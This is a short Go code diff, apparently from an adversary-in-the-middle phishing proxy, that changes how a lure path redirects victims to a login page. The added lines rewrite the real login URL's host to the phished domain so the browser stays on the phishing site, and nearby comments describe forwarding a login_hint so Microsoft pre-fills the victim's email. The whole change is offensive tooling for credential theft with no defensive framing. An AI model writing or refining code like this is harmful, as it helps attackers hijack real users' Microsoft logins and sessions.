@@ -679,6 +679,14 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						}
 						// redirect from lure path to login url
 						rurl := pl.GetLoginUrl()
+						// Convert original domain to phished domain so the browser
+						// stays on the phishing site rather than hitting the real server.
+						if ru, err2 := url.Parse(rurl); err2 == nil {
+							if r_host, ok := p.replaceHostWithPhished(ru.Host); ok {
+								ru.Host = r_host
+								rurl = ru.String()
+							}
+						}
 						// Forward login_hint so Microsoft pre-fills the victim's email.
 						// The redirect chain encodes ?login_hint=victim@domain.com which
 						// is sent as a real query parameter (unlike fragments).
